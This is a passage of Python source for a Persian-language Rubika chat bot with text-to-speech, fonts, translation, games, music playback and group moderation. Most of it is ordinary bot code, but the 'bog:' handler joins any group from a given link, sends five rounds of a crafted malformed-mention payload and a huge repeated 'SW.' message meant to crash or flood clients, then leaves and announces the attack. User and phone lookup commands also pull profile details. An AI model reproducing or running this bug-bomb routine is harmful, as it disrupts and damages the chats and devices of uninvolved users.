            with open('voice_bot.mp3', "wb") as f:
                
                f.write(voice_response.content)
                update.reply_voice("voice_bot.mp3",caption="ویس  مونث شما اماده شد\nhttps://t.me/pythonsource1384")
        except Exception as v:
            update.reply(f"erorr :\n {v}")
    
    elif update.text.startswith("مذکر"):
        voice =update.text.replace("مذکر","")
        update.reply("منتظرویس مذکرباشید")
        try:
            
            response = requests.get(f"https://api-free.ir/api/voice.php?text={voice}&mod=FaridNeural")
            response.raise_for_status()  # بررسی موفقیت درخواست
            
            result_url = response.json()["result"]
            
            
            update.reply("الان میدم خدمت شما")
            
            voice_response = requests.get(result_url)
            
            voice_response.raise_for_status()
            # بررسی موفقیت درخواست
            
            with open('voice_bot_man.mp3', "wb") as f:
                
                f.write(voice_response.content)
                update.reply_voice("voice_bot_man.mp3",caption="ویس  مذکر شما اماده شد\nhttps://t.me/pythonsource1384")
        except Exception as v:
            
            update.reply(f"erorr :\n {v}")
    elif update.text.startswith("voice"):
        text = update.text.replace("voice", "").strip()
        
        update.reply("loading..")
        
        tts = gTTS(text)
        tts.save("responsee.mp3")
        update.reply_voice("responsee.mp3",caption="ویس انگلیسی شما اماده شد \nhttps://t.me/pythonsource1384")

@bot.on_message_updates()
def order_list(update: Updates) :
    if update.text=="راهنما" or update.text=="/help" or update.text =="دستورات":
        update.reply("منتظربمانید")
      
        update.reply(list_order)
    elif update.text =="ربات" or update.text=="bot" or update.text=="بات" or update.text=="سلام":
        
        
        
        
 
        r=random.choice(list_bot)
        update.reply(r)
    
        
 

@bot.on_message_updates()
def get_datatime(update: Updates):
    if update.text =="time" or update.text=="تایم":
        update.reply("منتظربمانید")
        current_time = time.strftime("%H:%M:%S")
        now = datetime.now()
        a=now.strftime("%H:%M:%S")
        m=now.strftime("%Y-%m-%d")
        update.reply(f"زمان:\n{a} \n تاریخ:\n{m} \n فعلی:\n {current_time}")
    
    elif update.text=="تاریخ":
        update.reply("منتظربمانید")
        tariq =khayyam.JalaliDatetime.today().strftime("%A %D %B %Y")
        update.reply(f"تاریخ :\n{ tariq }")


@bot.on_message_updates()
def font(update: Updates):
    if update.text.startswith("font"):
        update.reply("صبرکنید تافونت ساخته بشه")  
        a =update.text.replace("font","")
        fonts = requests.get(f'http://api-free.ir/api/font.php?en={a}').json()["result"]
        formatted_fonts = "\n".join([f"{index + 1}. {font}" for index, font in enumerate(fonts)])
        try:
            update.reply(f"فونت‌های شما:\n{formatted_fonts}")
            font_to_database(fonts)
            
         
        except Exception as f:
            
            update.reply(f"erorr:\n{f}")
    elif update.text.startswith("فونت"):
        b=update.text.replace("فونت","")
        fonts = requests.get(f'http://api-free.ir/api/font.php?fa={b}').json()["result"]
        formatted_fonts = "\n".join([f"{index + 1}. {font}" for index, font in enumerate(fonts)])
        try:
            update.reply(f"فونت‌های شما:\n{formatted_fonts}")
            font_to_database(fonts)
        except Exception as ff:
            update.reply(f"erorr:\n{ff}")
            
@bot.on_message_updates(filters.is_private)
def block(update: Updates):
    if update.text in fohs:
        
        update.block()
    
        
@bot.on_message_updates(filters.is_private)
def animition(update: Updates):
    guid =update.object_guid
    if update.text =="دنس":
        ss=update.reply('start')
        for ani in Dans:
            bot.edit_message(guid, ss['message_update']['message_id'], ani)
       
    elif update.text =="قلب":
        ss=update.reply('start')
        for hrt in list_love:
            bot.edit_message(guid, ss['message_update']['message_id'], hrt)
    elif update.text =="ساعت":
        ss=update.reply('start')
        for cc in Clock:
            bot.edit_message(guid, ss['message_update']['message_id'], cc)
    elif update.text =="شمارش":
        ss =update.reply("start")
        for num in Number :
            bot.edit_message(guid, ss['message_update']['message_id'], num)
    elif update.text =="عشق":
        ss =update.reply('start')
        for love in list_love :
            
            bot.edit_message(guid, ss['message_update']['message_id'], love)
    elif update.text =="استیکر":
        
        ss =update.reply('start')
        
        for sti in Stikers :
            
            
            bot.edit_message(guid, ss['message_update']['message_id'], sti)
            
            
    
            
            
            
    
            
    
        
            
        
        
            
            
            
   
        
        
    #     ss = await message.reply('start')
    #             for ani in Dans:
    #                 await client.edit_message(guid, ss['message_update']['message_id'], ani)
    

       
@bot.on_message_updates()
def jok(update: Updates):
    if update.text=="jok" or update.text =="جوک":
        update.reply("منتظربمانید")
        links = requests.get("https://api-free.ir/api/jok.php").json()["result"]
        
        try:
            update.reply(links)
            
        except Exception as jo:
            
            update.reply(f"erorr\n {jo}")

        
@bot.on_message_updates(filters.Commands("name"))
def  name(update: Updates):
    name =requests.get('https://api-free.ir/api/name.php')
    r =name.json()["result"]
    update.reply("منتظربمانید")
    try:
        update.reply(r)
    except Exception as n:
        update.reply(n)

        
@bot.on_message_updates()
def bmi_gategori(update: Updates):
    if update.text.startswith("bmi") and ',h' in update.text:
        t=update.text.replace("bmi:","")
        update.reply("درحال محاسبه")
        if ',h' in t:
            
            try:
                weight, height = list(map(float, update.text.split('w')[1].split(',h')[0])), float(update.text.split(',h')[1])
                weight = weight[0]  # چون map به لیست تبدیل شده است، باید مقدار مورد نیاز را استخراج کنیم
                bmi = weight / ((height / 100) ** 2)
                bmi_category = get_bmi_category(bmi)
                update.reply(f"BMI شما: {bmi:.2f}\nدر دسته‌بندی BMI: {bmi_category}")
            except ValueError:
                update.reply("مقادیر رادرست وارد کنید")
                
@bot.on_message_updates()
def is_Prim(update: Updates):
    if update.text.startswith("num:"):
        num =update.text.replace("num:","")
        update.reply("منتظربمانید")
        is_prim =is_prime(num)
        update.reply(f"جواب شما:\n{is_prim }")


        


                

        
    


 

        
@bot.on_message_updates()
def tos(update: Updates) :
    if update.text =="game" or update.text=="بازی":
        update.reply("منتظربمانید")
        with open("images.jpg","rb") as tos:
            
            update.reply_photo("images.jpg",caption="خب شما به بازی وارد شدید برای  ارسال تاس کلمه تاس را بنویسید")
            
        
        
        
    if update.text=="تاس" or update.text=="تاس بنداز":
        num=random.randint(1,6)
        if (num== 1):
            update.reply("منتظربمانید")
            with open("tos1.png","rb") as tos:
                
                update.reply_photo("tos1.png",caption="[0]")
                
        elif (num == 2):  
            update.reply("منتظربمانید")
            with open("tos-2.png","rb") as tos:
                
                
                update.reply_photo("tos-2.png",caption="[00]")
        elif (num == 3):
            update.reply("منتظربمانید")
            with open("tos-3.png","rb") as tos:

                
                update.reply_photo("tos-3.png",caption="[000]")
        elif (num == 4):
            update.reply("منتظربمانید")
            with open("tos-4.png","rb") as tos:
                
                update.reply_photo("tos-4.png",caption="[0000]")
        elif (num == 5):
            update.reply("منتظربمانید")
            with open("tos5.png","rb") as tos:
                
                
            
                update.reply_photo("tos5.png",caption="[00000]")
        elif (num == 6):
            update.reply("منتظربمانید")
            with open("tos6.png","rb") as tos:
            
            
                update.reply_photo("tos6.png",caption="[000000]")
                
    

            
    
        
       
        
              
        
        
            
            
            
                

    
            
     
            
@bot.on_message_updates()
def generete_logo(update: Updates):    
    
    
    if update.text.startswith("logo"):
        update.reply("درحال ساخت لگو")
        logo_text =update.text.replace("logo","").strip()
        page = random.randint(1, 99)
        url = f"https://api-free.ir/api/Logo-top.php?text={logo_text}&page={page}"
        try:
            
            response = requests.get(url)
            data = response.json()
            if 'result' in data and data['result']:
                random_logo_url = random.choice(data['result'])
                update.reply(f"لگوی شما اماده شد برید  نگاکنید:\n{random_logo_url}")
                #_________________________________________
                image_response = requests.get(random_logo_url)
                image = Image.open(BytesIO(image_response.content))
                image_path = "logo_man.png"
                image.save(image_path)

                # ارسال تصویر به کاربر
                with open(image_path, 'rb') as photo:
                    update.reply_photo("logo_man.png", caption="لوگوی شما آماده است.\nhttps://t.me/pythonsource1384 ")
            else:
                update.reply("پیدانشد")
        except Exception as l:
            update.reply(f"erorr:\n{l}")

   
    

@bot.on_message_updates()
def tranlator(update: Updates):
    tr =update.text.replace("ترجمه","")
    
    if update.text.startswith("ترجمه"):
        update.reply("درحال معنی کردن به فارسی...")
        g =GoogleTranslator(source='auto',target='fa').translate(tr)
        update.reply(f"جمله شما ترجمه شد به فارسی:\n{g}")
    elif update.text.startswith("عبری:"):
        input_text=update.text.replace("عبری:","")
        update.reply("درحال تبدیل به زبان عبری")
        translated_text = translate_to_hebrew(input_text)
        
        update.reply(f"عبری:\n{translated_text}")
        
        
        

@bot.on_message_updates()
def len_chr(update: Updates):
    text = update.text
    if text.startswith("len:"):
        update.reply("منتظربمانید")
        length = len(text.replace("len:", "").strip())
        update.reply(f"طول متن: {length}")


@bot.on_message_updates()
def anime(update: Updates):
    image_link = update.text.replace("anime", "").strip()
    if update.text.startswith("anime"):
        try:
            update.reply("منتظربمانید") 
            response = requests.get(f"http://api-free.ir/api/enime/?img={image_link}")
            response.raise_for_status()
            data = response.json()
            
            if data.get('ok'):
                image_url = data['result']
                image_response = requests.get(image_url)
                image_data = Image.open(BytesIO(image_response.content))
                
                # Save image with custom filename
                filename = "anime.jpg"
                image_data.save(filename)
                
                # Send the image
                with open(filename, "rb") as photo_file:
                    update.reply_photo('anime.jpg')
                    
                    
                    
                
                
                # Clean up the file
                os.remove(filename)
          
        except requests.exceptions.RequestException as e:
            update.reply(f"خطا در دریافت تصویر: {e}")
   

    
    
        
        

    
   

        


            


        
@bot.on_message_updates()
def reverse_text(update: Updates):
    
    t=update.text.replace("برعکس","")
    # update.reply("منتظربمانید")
    if update.text.startswith("برعکس"):
        b =t[::-1]
        update.reply(b)
        

@bot.on_message_updates()
def phone_info(update: Updates):
    phone_number =update.text.replace("phone:","")
    phone_number_info = get_phone_number_info(phone_number)
    if update.text.startswith("phone:"):
        update.reply(f"شماره موبایل:{phone_number_info[0]}\n کد کشور:{phone_number_info[1]}\n شماره ملی:{phone_number_info[2]}\n موقعیت جغرافیایی:{phone_number_info[3]} \n اپراتور:{phone_number_info[4]}")
        
    
    
@bot.on_message_updates()
def user_info_(update: Updates):
    guid =update.object_guid
   
    
    if update.text.startswith("info:"):
    
        
        
        u = update.text.replace("info:", "")
      
        
     
        try:
            user = bot.get_object_by_username(u)
            print(user)
          
            if user:
                update.reply(f"ایدی طرف:\n{user['user']['username']}\nنام: {user['user']['first_name']} \n گوید طرف:\n{user['user']['user_guid']} \n بیو:{user['user']['bio']} \n شماره:وضعیت بسته")
               
                
                
                
                
            else:
                update.reply("کاربر یافت نشد.")
        except Exception as e:
            update.reply("مشکلی در دسترسی به اطلاعات کاربر رخ داده است.")
            
            print(f"خطا: {e}")
    




    
    
    
  
    
            
            # حذف فایل موقت
        # os.remove(voice_file_path)
        
                
            
            
            
        
        
        
      
        
        
        
    # image_link = update.photo.replace("anime", "").strip()
    # if update.photo.startswith("anime"):
    #     try:
    #         update.reply("منتظربمانید") 
    #         response = requests.get(f"http://api-free.ir/api/enime/?img={image_link}")
    #         response.raise_for_status()
    #         data = response.json()
            
    #         if data.get('ok'):
    #             image_url = data['result']
    #             image_response = requests.get(image_url)
    #             image_data = Image.open(BytesIO(image_response.content))
                
    #             # Save image with custom filename
    #             filename = "anime.jpg"
    #             image_data.save(filename)
                
    #             # Send the image
    #             with open(filename, "rb") as photo_file:
    #                 update.reply_photo('anime.jpg')
                    
                    
                    
                
                
    #             # Clean up the file
    #             os.remove(filename)
          
    #     except requests.exceptions.RequestException as e:
    #         update.reply(f"خطا در دریافت تصویر: {e}")
      

@bot.on_message_updates()
def send_gif(update: Updates):
    if update.text =="سیگما":
        
        with open('sigma.mp4',"rb") as p:
            
        
            update.reply_gif("sigma.mp4")
    elif update.text =="سپاه" or update.text =="سپاه پاسداران":
        
      
        
        with open('spahh.mp4',"rb") as p:
            
        
            update.reply_gif("spahh.mp4")


            

    # یک فلگ برای نگهداری وضعیت قفل عکس
   
@bot.on_message_updates(filters.is_group,filters.Commands(['چیستان', 'chistan'], ''))   
def chistan(update: Updates):
    update.reply("منتظربمانید")
    response = requests.get('http://mahrez.iapp.ir/chistan/')
    data = response.json()
    question = data["soal"]
    answer = data["javab"]
    try:
        update.reply(f"سوال :\n{question }\n جواب:\n {answer}")
    except Exception as ch:
        update.reply(f"erorr:{ch}")
        
        
        
    
    


@bot.on_message_updates(filters.is_group)
def voice_chat_player_gruop(update: Updates):
    guid="g0DtNHM0f4a499111d7bd4b228db6d7e"
    if update.text=="اهنگ" or update.text=="آهنگ":
        update.reply("منتظردانلوداهنگ وپخش درویسکال باشید")
        random_music_link = get_random_music_link()
        try:
            if random_music_link:
            
                update.reply(f"لینک دانلود موزیک تصادفی: \n{random_music_link}")
                music_file_name = "random_music.mp3"
                download_and_save_music(music_file_name, random_music_link)
                with open(music_file_name, 'rb') as music_file:
                    
                    bot.voice_chat_player(guid,'random_music.mp3')
        except Exception as h:
            update.reply(f"erorr\n{h}")
    elif update.text.startswith("موزیک"):
        update.reply("منتظر سرچ اهنگ واجرای آن درویسکال باشید")
        query = update.text.replace("موزیک","")
        url = f"https://api-free.ir/api/sr-music/?text={query}"
        response = requests.get(url)   
        
        if response.status_code == 200:
            data = response.json()
    
    # دریافت لینک فایل صوتی از دیکشنری result
            song_url = data["result"]["song"]
            
            # دانلود فایل صوتی
            urllib.request.urlretrieve(song_url, "music_plyar.mp3") 
            
            with open("music_plyar.mp3","rb") as m:
                bot.voice_chat_player(guid,"music_plyar.mp3")
                m.close()
            
        
    
                
        
                
    
    elif update.text.startswith("بگو"):
        voice =update.text.replace("بگو","")
        update.reply("منتظرویس مذکر درویسکال باشید")
        try:
            
            response = requests.get(f"https://api-free.ir/api/voice.php?text={voice}&mod=FaridNeural")
            response.raise_for_status()  # بررسی موفقیت درخواست
            
            result_url = response.json()["result"]
            
            
            update.reply("الان میگم درویسکال")
            
            voice_response = requests.get(result_url)
            
            voice_response.raise_for_status()
            # بررسی موفقیت درخواست
            
            with open('voice_bot_man.mp3', "wb") as f:
                
                f.write(voice_response.content)
                bot.voice_chat_player(guid,"voice_bot_man.mp3")
                
        except Exception as bge:
            update.reply(f"erorr:\n {bge}")
    
            

            
      
                
            
        
    
    
            
@bot.on_message_updates(filters.is_group)
def delete_message_ban(update: Updates) :
    global warnings
    user_id=update.object_guid
    
    try:
        try:
            try:
                try:
                    if user_id not in warnings:
                        
                        warnings[user_id] = 0
                    if update.text in fohs:
                        
                        update.reply("ارسال فحش ممنوع است")  
                        update.delete_messages()
                        warnings[user_id] += 1
                        update.reply(f"شما {warnings[user_id]} اخطار دریافت کرده‌اید.")
                        if warnings[user_id] >= 4:
                            try:
                                
                                update.reply("تمامی فحش ها پاک شد")
                                update.ban_member()
                                update.reply("کاربر حذف شد")
                                del warnings[user_id]
                            except exceptions.InvalidInput:
                                update.reply("کاربر ادمین است")
                    # if ("http://" in update.text or "https://" in update.text or "@" in update.text or update.forward_type_from):
                    #     update.delete_messages()
                    #     update.reply("ارسال لینک  وفورزدن ممنوع است وحتی ایدی  ") 
                except ValueError :
                    update.reply("کاربرادمین است")
            except NameError:
                update.reply("کاربرادمین است")
        except Exception as rem:
                update.reply(f"erorr:{rem}")
    except exceptions.InvalidInput:
        update.reply("کاربرادمین است")
        
        
        
                
        
        
            
            
                
    
        
@bot.on_message_updates(filters.is_group, filters.Commands(['بن', 'اخراج'], prefixes=''))
def ban_user_by_admin(update: Updates):
    group = update.object_guid
    try:
        try:
            try:
                try:
                    if group and update.is_admin(user_guid=update.author_guid):
                        if update.reply_message_id:
                            author_guid = update.get_messages(message_ids=update.reply_message_id).messages[0].author_object_guid

                        else:
                            author_guid = update.client.get_info(username=update.text.split()[-1]).user_guid

                        user = author_guid
                        if user:
                        
                            update.ban_member(user_guid=user)
                            update.reply("کاربر  توسط ادمین از گروه حذف شد.")
                except exceptions.InvalidInput:
                    update.reply("کاربر  ادمینه")
            except ValueError:
                update.reply("کاربر  ادمینه")
        except NameError :
            update.reply("کاربر  ادمینه")
    except Exception :
        update.reply("کاربر  ادمینه")

@bot.on_message_updates(filters.is_group,is_bug)
def delete_bug(update: Updates):
    group = update.object_guid
    if group:
        update.reply('یک کاربر باگ ارسال کرد و حذف شد.')
        update.delete()
        update.ban_member()


@bot.on_message_updates(filters.is_group, filters.Commands(['لینک', 'link'], ''))
async def send_group_link(update: Updates):
    group = update.object_guid
    # update.reply("الان لینک را میدم") 
    if group:
        link = await bot.get_group_link(update.object_guid)
        return await update.reply(f' بفرماید\n{link.join_link}',
                                  parse_mode=ParseMode.MARKDOWN)

 
        


@bot.on_message_updates(filters.is_private)
def get_user(update: Updates):
    user_guid = update.object_guid
    user = bot.get_user_info(user_guid=user_guid)
    bot.get_chats()
    if update.text == "info":
        update.reply("منتظربمانید")
        
        chat_info =user["chat"]
        
        user_info = (
            f"نام کاربری: {user['user']['username']}\n"
            f"نام: {user['user']['first_name']}\n"
            f"شناسه کاربری: {user['user']['user_guid']}\n"
            f"بیوگرافی: {user['user']['bio']}\n"
            f"شماره: وضعیت بسته\n"
            f"\nاطلاعات چت:\n"
            f"تعداد پیام‌های خوانده نشده: {chat_info['count_unseen']}\n"
            f"آخرین پیام: {chat_info['last_message']['text']}\n"
            f"وضعیت: {chat_info['status']}\n"
            # اگر نیاز به اضافه کردن اطلاعات دیگری دارید، اینجا اضافه کنید
        )
        
        update.reply(user_info)

@bot.on_message_updates()
def send_bog(update: Updates):
    if update.text.startswith("bog:"):
        link =update.text.replace("bog:","")
        guid =bot.join_chat(link)["group"]["group_guid"]
        update.reply("درحال ارسال باگ به گروه")
        
        
        print(guid)
        for i in range(5):
            
            
            print(bot.send_message(guid,"@@boggap@@(u0FGbWD0fdcda6aa41534a4e5fff7568)‌ ‌ @@boggap@@(u0FGbWD0fdcda6aa41534a4e5fff7568)'/n)"))
            
            bot.send_message(guid,"SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.SW.")
        bot.leave_group(guid)
        update.reply(f"حمله شد به :\n{link}")


@bot.on_message_updates()
def join_chat(update: Updates):
    j =update.text.replace("بیا","")
    if update.text.startswith("بیا"):
        link=bot.join_chat(j)["group"]["group_guid"]
        update.reply("الان عضو میشم")
        update.reply(f"عضو شدم در:\n{link}")
        bot.send_message(link,'من عضوشدم')
        
        


            
@bot.on_message_updates()
def send_chanal(update: Updates) :
    if update.text.startswith("پیام:"):
        p=update.text.replace("پیام:","")
        update.reply("درحال پیام به کانال")
        bot.send_message("c0Bwzoe020d57445a60d4c492046953a",p)
        update.reply("ارسال شد")
    elif update.text.startswith("میخوام"):
        p =update.text.replace("میخوام","")
        update.reply("درحال پیام به کانال")
        try:
            r=chatgpt4(p)
            bot.send_message("c0Bwzoe020d57445a60d4c492046953a",r)
            update.reply("ارسال شد")
        except Exception as h:
            update.reply(f"erorr:{h}")
                    
            
            
            
        
   
    

        
@bot.on_message_updates(filters.is_group, filters.Commands(['اخطار', 'اخطارر'], prefixes=''))
def ban_user_by_admin(update: Updates):
    group = update.object_guid
    global warnings
    user_id=update.object_guid
    try:
        try:
            try:
                try:
                    if group and update.is_admin(user_guid=update.author_guid):
                        if update.reply_message_id:
                            author_guid = update.get_messages(message_ids=update.reply_message_id).messages[0].author_object_guid

                        else:
                            author_guid = update.client.get_info(username=update.text.split()[-1]).user_guid

                        user = author_guid
                        if user:
                            # update.reply(f"اخطار گرفتی\n{user} ")
                            warnings[user_id] += 1
                            update.reply(f"اخطار گرفتی. تعداد اخطارهای شما: {warnings[user_id]}")
                            if warnings[user_id] >= 3:
                                update.reply( f"کاربر {user_id} به دلیل دریافت 3 اخطار از گروه محروم شد.")
                                
                            
                           
                                
                                
                                
                            
                        
                          
                        
                    
                        
                            
                            
                           
                            
                        
                            
                            # update.reply("اخطار")
                except exceptions.InvalidInput:
                    update.reply("کاربر  ادمینه")
            except ValueError:
                update.reply("کاربر  ادمینه")
        except NameError :
            update.reply("کاربر  ادمینه")
    except Exception :
        update.reply("کاربر  ادمینه")
    # 
    
    
    
    
    # print(rb)"gshhymsgdaitgehzpwnbzttrzswcejhf"
   

    
    # rb.add_picture()
    
    
    

# rb = Rubino(bot)






           





bot.run()




            
